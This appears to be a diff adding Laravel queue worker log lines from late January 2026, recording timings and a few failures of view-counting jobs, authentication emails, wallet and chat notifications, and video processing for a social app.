+  2026-01-24 00:38:43 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:38:43 App\Jobs\User\Views\RegisterResourceViews . 13.04ms DONE
+  2026-01-24 00:39:43 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:39:43 App\Jobs\User\Views\RegisterResourceViews . 13.15ms DONE
+  2026-01-24 00:40:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:40:10 App\Jobs\User\Views\RegisterResourceViews . 10.69ms DONE
+  2026-01-24 02:28:47 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 02:28:48 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-24 08:34:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 08:34:03 App\Jobs\User\Views\RegisterResourceViews . 16.15ms DONE
+  2026-01-24 08:51:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 08:51:04 App\Jobs\User\Views\RegisterResourceViews . 15.52ms DONE
+  2026-01-24 10:01:48 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-24 10:01:49 App\Mail\User\Auth\ResetPasswordMail ..... 722.66ms DONE
+  2026-01-24 10:07:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 10:07:10 App\Jobs\User\Views\RegisterResourceViews . 18.94ms DONE
+  2026-01-24 10:57:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 10:57:36 App\Jobs\User\Views\RegisterResourceViews . 14.66ms DONE
+  2026-01-24 11:44:33 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 11:44:33 App\Mail\User\Auth\VerifyEmailMail ....... 705.50ms DONE
+  2026-01-24 11:44:38 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 11:44:39 App\Mail\User\Auth\VerifyEmailMail ....... 688.22ms DONE
+  2026-01-24 11:48:09 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-24 11:48:10 App\Mail\User\Auth\ResetPasswordMail ..... 822.92ms DONE
+  2026-01-24 11:50:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 11:50:06 App\Jobs\User\Views\RegisterResourceViews . 15.26ms DONE
+  2026-01-24 11:51:25 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-24 11:51:26 App\Mail\User\Auth\ResetPasswordMail ..... 756.44ms DONE
+  2026-01-24 12:36:19 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 12:36:20 App\Mail\User\Auth\VerifyEmailMail ....... 676.19ms DONE
+  2026-01-24 15:52:25 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 15:52:25 App\Jobs\User\Views\RegisterResourceViews . 15.62ms DONE
+  2026-01-24 15:56:16 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 15:56:16 App\Jobs\User\Views\RegisterResourceViews . 14.94ms DONE
+  2026-01-24 15:58:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 15:58:34 App\Jobs\User\Views\RegisterResourceViews . 11.16ms DONE
+  2026-01-24 16:13:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 16:13:26 App\Jobs\User\Views\RegisterResourceViews . 12.34ms DONE
+  2026-01-24 17:38:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 17:38:53 App\Jobs\User\Views\RegisterResourceViews . 10.59ms DONE
+  2026-01-24 18:04:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 18:04:30 App\Jobs\User\Views\RegisterResourceViews . 13.41ms DONE
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  16.62ms DONE
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  627.56ms DONE
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-24 21:37:18 App\Notifications\User\Wallet\PaymentReceivedNotification  6.75ms DONE
+  2026-01-24 21:37:18 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-24 21:37:18 Illuminate\Notifications\Events\BroadcastNotificationCreated  51.19ms DONE
+  2026-01-24 21:39:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 21:39:31 App\Jobs\User\Views\RegisterResourceViews . 19.25ms DONE
+  2026-01-24 22:44:12 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 22:44:13 App\Mail\User\Auth\VerifyEmailMail ....... 766.48ms DONE
+  2026-01-24 22:45:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 22:45:28 App\Jobs\User\Views\RegisterResourceViews . 10.98ms DONE
+  2026-01-24 23:07:47 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:07:47 App\Jobs\User\Views\RegisterResourceViews . 13.52ms DONE
+  2026-01-24 23:07:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:07:56 App\Jobs\User\Views\RegisterResourceViews . 11.19ms DONE
+  2026-01-24 23:10:23 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-24 23:10:23 App\Notifications\User\Chat\MessageReceivedNotification  3.82ms DONE
+  2026-01-24 23:10:23 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-24 23:10:23 Illuminate\Notifications\Events\BroadcastNotificationCreated  34.69ms DONE
+  2026-01-24 23:10:32 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:10:32 App\Jobs\User\Views\RegisterResourceViews . 10.10ms DONE
+  2026-01-24 23:11:06 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-24 23:11:06 App\Mail\User\Auth\VerifyEmailMail ....... 684.77ms DONE
+  2026-01-24 23:12:42 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:12:42 App\Jobs\User\Views\RegisterResourceViews . 11.28ms DONE
+  2026-01-24 23:12:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:12:53 App\Jobs\User\Views\RegisterResourceViews .. 9.34ms DONE
+  2026-01-24 23:42:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:42:24 App\Jobs\User\Views\RegisterResourceViews . 12.11ms DONE
+  2026-01-24 23:43:14 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  RUNNING
+  2026-01-24 23:43:25 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  11s DONE
+  2026-01-24 23:43:40 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 23:43:40 App\Jobs\User\Views\RegisterResourceViews . 12.34ms DONE
+  2026-01-25 00:21:27 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 00:21:27 App\Jobs\User\Views\RegisterResourceViews . 11.35ms DONE
+  2026-01-25 04:11:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 04:11:24 App\Jobs\User\Views\RegisterResourceViews . 12.66ms DONE
+  2026-01-25 09:16:35 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 09:16:35 App\Jobs\User\Views\RegisterResourceViews . 12.91ms DONE
+  2026-01-25 09:18:33 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-25 09:18:33 Illuminate\Notifications\Events\BroadcastNotificationCreated  301.83ms DONE
+  2026-01-25 10:10:13 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 10:10:13 App\Jobs\User\Views\RegisterResourceViews . 11.50ms DONE
+  2026-01-25 12:45:50 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-25 12:45:51 App\Mail\User\Auth\VerifyEmailMail ....... 738.73ms DONE
+  2026-01-25 12:49:39 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-25 12:49:40 App\Mail\User\Auth\VerifyEmailMail ....... 711.11ms DONE
+  2026-01-25 12:49:43 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-25 12:49:43 App\Mail\User\Auth\VerifyEmailMail ....... 660.41ms DONE
+  2026-01-25 14:04:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 14:04:04 App\Jobs\User\Views\RegisterResourceViews . 21.31ms DONE
+  2026-01-25 14:29:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 14:29:51 App\Jobs\User\Views\RegisterResourceViews . 38.52ms DONE
+  2026-01-25 17:30:42 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-25 17:30:42 App\Mail\User\Auth\VerifyEmailMail ....... 723.94ms DONE
+  2026-01-25 17:34:27 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-25 17:34:27 App\Mail\User\Auth\ResetPasswordMail ..... 756.05ms DONE
+  2026-01-25 17:37:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 17:37:04 App\Jobs\User\Views\RegisterResourceViews . 28.53ms DONE
+  2026-01-25 17:37:13 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-25 17:37:13 App\Notifications\User\Follows\NewFollowerNotification  649.25ms DONE
+  2026-01-25 17:37:49 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-25 17:37:49 App\Notifications\User\Chat\MessageReceivedNotification  14.87ms DONE
+  2026-01-25 17:37:49 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-25 17:37:49 Illuminate\Notifications\Events\BroadcastNotificationCreated  55.45ms DONE
+  2026-01-25 20:05:07 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:05:07 App\Jobs\User\Views\RegisterResourceViews . 15.26ms DONE
+  2026-01-25 20:09:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:09:31 App\Jobs\User\Views\RegisterResourceViews . 15.35ms DONE
+  2026-01-25 20:12:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:12:17 App\Jobs\User\Views\RegisterResourceViews . 10.57ms DONE
+  2026-01-25 20:12:37 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-25 20:12:37 App\Notifications\User\Chat\MessageReceivedNotification  4.20ms DONE
+  2026-01-25 20:12:37 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-25 20:12:37 Illuminate\Notifications\Events\BroadcastNotificationCreated  82.64ms DONE
+  2026-01-25 20:17:44 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:17:44 App\Jobs\User\Views\RegisterResourceViews .. 9.70ms DONE
+  2026-01-25 20:18:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:18:05 App\Jobs\User\Views\RegisterResourceViews .. 9.76ms DONE
+  2026-01-25 20:55:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 20:55:51 App\Jobs\User\Views\RegisterResourceViews . 11.45ms DONE
+  2026-01-25 21:38:50 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 21:38:50 App\Jobs\User\Views\RegisterResourceViews . 12.71ms DONE
+  2026-01-25 21:49:38 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:49:38 App\Notifications\User\Wallet\PaymentReceivedNotification  20.10ms DONE
+  2026-01-25 21:49:38 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:49:39 App\Notifications\User\Wallet\PaymentReceivedNotification  753.03ms DONE
+  2026-01-25 21:50:21 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:50:21 App\Notifications\User\Wallet\PaymentReceivedNotification  18.19ms DONE
+  2026-01-25 21:50:21 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-25 21:50:21 Illuminate\Notifications\Events\BroadcastNotificationCreated  80.39ms DONE
+  2026-01-25 21:51:06 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:51:06 App\Notifications\User\Wallet\PaymentReceivedNotification  19.52ms DONE
+  2026-01-25 21:51:06 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:51:06 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-25 21:51:06 App\Notifications\User\Wallet\PaymentReceivedNotification  5.66ms DONE
+  2026-01-25 21:51:06 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-25 21:51:06 Illuminate\Notifications\Events\BroadcastNotificationCreated  56.90ms DONE
+  2026-01-25 21:51:07 App\Notifications\User\Wallet\PaymentReceivedNotification  677.30ms DONE
+  2026-01-25 23:02:01 App\Jobs\User\Story\ProcessStoryVideo .......... RUNNING
+  2026-01-25 23:02:29 App\Jobs\User\Story\ProcessStoryVideo ......... 28s DONE
+  2026-01-25 23:13:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-25 23:13:51 App\Jobs\User\Views\RegisterResourceViews . 12.89ms DONE
+  2026-01-26 01:35:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 01:35:51 App\Jobs\User\Views\RegisterResourceViews . 15.21ms DONE
+  2026-01-26 01:46:38 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 01:46:38 App\Jobs\User\Views\RegisterResourceViews . 16.83ms DONE
+  2026-01-26 06:03:35 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 06:03:35 App\Jobs\User\Views\RegisterResourceViews . 17.52ms DONE
+  2026-01-26 09:12:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 09:12:10 App\Jobs\User\Views\RegisterResourceViews . 14.86ms DONE
+  2026-01-26 13:07:32 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 13:07:32 App\Jobs\User\Views\RegisterResourceViews . 12.87ms DONE
+  2026-01-26 14:06:59 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-26 14:07:00 App\Mail\User\Auth\ResetPasswordMail ..... 763.00ms DONE
+  2026-01-26 14:20:39 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 14:20:39 App\Jobs\User\Views\RegisterResourceViews . 21.89ms DONE
+  2026-01-26 16:27:38 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-26 16:27:38 Illuminate\Notifications\Notification ...... 8.99ms DONE
+  2026-01-26 16:27:39 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-26 16:27:39 Illuminate\Notifications\Notification ..... 10.43ms DONE
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification ...... 7.33ms FAIL
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification ...... 0.83ms FAIL
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-26 16:27:41 Illuminate\Notifications\Notification ...... 1.49ms FAIL
+  2026-01-26 17:07:16 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-26 17:07:16 App\Mail\User\Auth\VerifyEmailMail ......... 5.08ms FAIL
+  2026-01-26 17:07:16 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-26 17:07:17 App\Mail\User\Auth\VerifyEmailMail ....... 826.99ms DONE
+  2026-01-26 17:07:29 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-26 17:07:29 App\Mail\User\Auth\VerifyEmailMail ....... 583.51ms DONE
+  2026-01-26 18:48:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 18:48:53 App\Jobs\User\Views\RegisterResourceViews . 11.87ms DONE
+  2026-01-26 18:50:23 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 18:50:23 App\Jobs\User\Views\RegisterResourceViews . 11.94ms DONE
+  2026-01-26 19:20:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 19:20:28 App\Jobs\User\Views\RegisterResourceViews .. 3.56ms FAIL
+  2026-01-26 19:20:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 19:20:28 App\Jobs\User\Views\RegisterResourceViews . 10.78ms DONE
+  2026-01-26 19:33:01 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 19:33:01 App\Jobs\User\Views\RegisterResourceViews . 14.82ms DONE
+  2026-01-26 23:16:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 23:16:53 App\Jobs\User\Views\RegisterResourceViews . 11.82ms DONE
+  2026-01-26 23:18:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 23:18:02 App\Jobs\User\Views\RegisterResourceViews . 12.85ms DONE
+  2026-01-26 23:18:35 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 23:18:35 App\Jobs\User\Views\RegisterResourceViews . 10.18ms DONE
+  2026-01-26 23:50:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-26 23:50:54 App\Jobs\User\Views\RegisterResourceViews . 15.97ms DONE
+  2026-01-27 00:09:46 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 00:09:46 App\Jobs\User\Views\RegisterResourceViews . 12.32ms DONE
+  2026-01-27 05:39:32 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 05:39:32 App\Jobs\User\Views\RegisterResourceViews . 15.49ms DONE
+  2026-01-27 09:36:03 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-27 09:36:03 App\Notifications\User\Chat\MessageReceivedNotification  7.54ms DONE
+  2026-01-27 09:36:03 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-27 09:36:03 Illuminate\Notifications\Events\BroadcastNotificationCreated  59.62ms DONE
+  2026-01-27 15:10:48 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 15:10:48 App\Jobs\User\Views\RegisterResourceViews . 18.10ms DONE
+  2026-01-27 16:01:57 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-27 16:02:01 App\Mail\User\Auth\VerifyEmailMail ............. 4s DONE
+  2026-01-27 18:08:22 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 18:08:22 App\Jobs\User\Views\RegisterResourceViews . 19.24ms DONE
+  2026-01-27 18:55:18 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 18:55:18 App\Jobs\User\Views\RegisterResourceViews . 12.26ms DONE
+  2026-01-27 19:32:41 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 19:32:41 App\Jobs\User\Views\RegisterResourceViews . 12.49ms DONE
+  2026-01-27 20:02:36 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-27 20:02:37 App\Mail\User\Auth\VerifyEmailMail ....... 793.62ms DONE
+  2026-01-27 20:02:49 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-27 20:02:50 App\Mail\User\Auth\VerifyEmailMail ....... 682.66ms DONE
+  2026-01-27 20:32:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 20:32:03 App\Jobs\User\Views\RegisterResourceViews . 15.06ms DONE
+  2026-01-27 20:39:15 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-27 20:39:15 App\Jobs\User\Views\RegisterResourceViews . 13.30ms DONE
+  2026-01-28 02:14:24 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-28 02:14:25 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-28 02:15:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 02:15:45 App\Jobs\User\Views\RegisterResourceViews . 13.66ms DONE
+  2026-01-28 02:16:06 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 02:16:06 App\Notifications\User\Follows\NewFollowerNotification  11.50ms DONE
+  2026-01-28 02:16:06 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 02:16:06 App\Notifications\User\Follows\NewFollowerNotification  14.46ms DONE
+  2026-01-28 02:16:06 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 02:16:07 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-28 02:16:07 Illuminate\Notifications\Events\BroadcastNotificationCreated  55.27ms DONE
+  2026-01-28 02:16:08 App\Notifications\User\Follows\NewFollowerNotification  1s DONE
+  2026-01-28 02:42:44 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-28 02:42:44 App\Notifications\User\Post\PostCommentedNotification  15.54ms DONE
+  2026-01-28 02:42:44 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-28 02:42:44 App\Notifications\User\Post\PostCommentedNotification  15.53ms DONE
+  2026-01-28 02:42:44 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-28 02:42:45 App\Notifications\User\Post\PostCommentedNotification  706.57ms DONE
+  2026-01-28 02:42:45 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-28 02:42:45 Illuminate\Notifications\Events\BroadcastNotificationCreated  51.81ms DONE
+  2026-01-28 04:50:20 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-28 04:50:21 App\Mail\User\Auth\VerifyEmailMail ....... 779.82ms DONE
+  2026-01-28 04:54:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 04:54:02 App\Jobs\User\Views\RegisterResourceViews . 12.27ms DONE
+  2026-01-28 04:56:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 04:56:05 App\Jobs\User\Views\RegisterResourceViews . 11.58ms DONE
+  2026-01-28 05:08:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 05:08:24 App\Jobs\User\Views\RegisterResourceViews . 11.48ms DONE
+  2026-01-28 06:56:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 06:56:49 App\Jobs\User\Views\RegisterResourceViews . 14.99ms DONE
+  2026-01-28 06:57:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 06:57:10 App\Jobs\User\Views\RegisterResourceViews . 10.22ms DONE
+  2026-01-28 08:59:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 08:59:30 App\Jobs\User\Views\RegisterResourceViews . 17.20ms DONE
+  2026-01-28 10:28:48 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 10:28:48 App\Jobs\User\Views\RegisterResourceViews . 11.79ms DONE
+  2026-01-28 11:32:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 11:32:03 App\Jobs\User\Views\RegisterResourceViews . 11.30ms DONE
+  2026-01-28 11:50:22 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 11:50:22 App\Jobs\User\Views\RegisterResourceViews . 18.65ms DONE
+  2026-01-28 15:11:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-28 15:11:08 Illuminate\Notifications\Notification ...... 9.53ms DONE
+  2026-01-28 16:53:44 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 16:53:45 App\Mail\User\Auth\RegistrationCodeMail ........ 1s DONE
+  2026-01-28 17:19:58 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 17:19:59 App\Mail\User\Auth\RegistrationCodeMail .. 783.00ms DONE
+  2026-01-28 17:24:01 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 17:24:02 App\Mail\User\Auth\RegistrationCodeMail .. 631.65ms DONE
+  2026-01-28 17:27:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 17:27:05 App\Jobs\User\Views\RegisterResourceViews . 29.00ms DONE
+  2026-01-28 17:38:17 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 17:38:18 App\Mail\User\Auth\RegistrationCodeMail .. 809.30ms DONE
+  2026-01-28 17:40:45 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 17:40:45 App\Mail\User\Auth\RegistrationCodeMail .. 834.32ms DONE
+  2026-01-28 17:45:34 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 17:45:34 App\Mail\User\Auth\RegistrationCodeMail .. 810.60ms DONE
+  2026-01-28 18:16:44 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 18:16:44 App\Jobs\User\Views\RegisterResourceViews . 25.60ms DONE
+  2026-01-28 18:25:05 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 18:25:07 App\Mail\User\Auth\RegistrationCodeMail ........ 1s DONE
+  2026-01-28 18:31:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 18:31:31 App\Jobs\User\Views\RegisterResourceViews . 11.49ms DONE
+  2026-01-28 19:18:59 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 19:19:00 App\Mail\User\Auth\RegistrationCodeMail .. 700.27ms DONE
+  2026-01-28 19:19:48 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 19:19:48 App\Jobs\User\Views\RegisterResourceViews .. 9.78ms DONE
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  31.56ms DONE
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  12.09ms DONE
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  11.58ms DONE
+  2026-01-28 19:19:54 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-28 19:19:54 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-28 19:19:54 Illuminate\Notifications\Events\BroadcastNotificationCreated  89.71ms DONE
+  2026-01-28 19:19:54 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-28 19:19:54 Illuminate\Notifications\Events\BroadcastNotificationCreated  12.13ms DONE
+  2026-01-28 19:19:55 App\Notifications\User\Post\PostReactedNotification  606.61ms DONE
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  7.58ms DONE
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  12.81ms DONE
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-28 19:19:55 App\Notifications\User\Follows\NewFollowerNotification  604.16ms DONE
+  2026-01-28 19:22:12 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 19:22:13 App\Mail\User\Auth\RegistrationCodeMail .. 741.73ms DONE
+  2026-01-28 20:10:33 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-01-28 20:10:34 App\Mail\User\Auth\PasswordResetCodeMail . 657.67ms DONE
+  2026-01-28 20:14:58 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-01-28 20:14:58 App\Mail\User\Auth\PasswordResetCodeMail . 665.29ms DONE
+  2026-01-28 20:31:08 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 20:31:08 App\Jobs\User\Views\RegisterResourceViews . 12.07ms DONE
+  2026-01-28 20:31:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 20:31:26 App\Jobs\User\Views\RegisterResourceViews . 10.97ms DONE
+  2026-01-28 20:33:02 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 20:33:03 App\Mail\User\Auth\RegistrationCodeMail .. 815.52ms DONE
+  2026-01-28 20:33:32 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-28 20:33:33 App\Mail\User\Auth\RegistrationCodeMail .. 682.08ms DONE
+  2026-01-28 20:46:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 20:46:54 App\Jobs\User\Views\RegisterResourceViews . 11.50ms DONE
+  2026-01-28 21:04:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
